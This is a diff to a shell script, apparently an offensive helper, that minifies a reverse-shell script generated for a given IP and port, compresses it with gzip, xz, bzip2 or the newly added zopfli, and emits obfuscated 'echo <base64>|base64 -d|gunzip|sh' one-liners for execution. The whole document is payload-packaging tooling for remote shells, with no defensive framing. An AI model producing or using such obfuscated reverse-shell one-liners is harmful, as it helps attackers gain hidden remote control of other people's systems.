@@ -2,7 +2,7 @@
 # Usage: encode <file> [H=<ip>] [P=<port>]
 # If H and P are given, regenerates <file> via the revshell script first.
 # Minifies (strips indentation + blank lines) then tries every available
-# compressor (gzip, xz, bzip2) and emits the shortest one-liner.
+# compressor (gzip, xz, bzip2, zopfli) and emits a one-liner per compressor.
 
 FILE="${1:?usage: encode <file> [H=ip] [P=port]}"; shift
 H="" P=""
@@ -31,6 +31,31 @@ try() {
   printf '[%s %d chars] %s\n' "$cmd" "${#line}" "$line"
 }
 
-try gzip  gunzip
-try xz    "xz -d"
-try bzip2 bunzip2
+try_zopfli() {
+  if ! command -v zopfli &>/dev/null; then
+    printf '[zopfli] not found — install with:\n' >&2
+    printf '           apt:  sudo apt install zopfli\n' >&2
+    printf '           brew: brew install zopfli\n' >&2
+    printf '           src:  https://github.com/google/zopfli\n' >&2
+    return
+  fi
+  local payload line tmp
+  # Some builds support --stdout; fall back to temp-file (standard zopfli
+  # always writes <file>.gz and has no stdout flag).
+  payload=$(zopfli --gzip --i1000 --stdout "$FILE" 2>/dev/null | base64 | tr -d '\n')
+  if [[ -z "$payload" ]]; then
+    tmp=$(mktemp /tmp/zopfli.XXXXXX)
+    cp "$FILE" "$tmp"
+    zopfli --gzip --i1000 "$tmp" 2>/dev/null
+    [[ -f "${tmp}.gz" ]] && payload=$(base64 < "${tmp}.gz" | tr -d '\n')
+    rm -f "$tmp" "${tmp}.gz"
+  fi
+  [[ -n "$payload" ]] || { printf '[zopfli] compression failed\n' >&2; return; }
+  line="echo ${payload}|base64 -d|gunzip|sh"
+  printf '[zopfli %d chars] %s\n' "${#line}" "$line"
+}
+
+try gzip   gunzip
+try xz     "xz -d"
+try bzip2  bunzip2
+try_zopfli
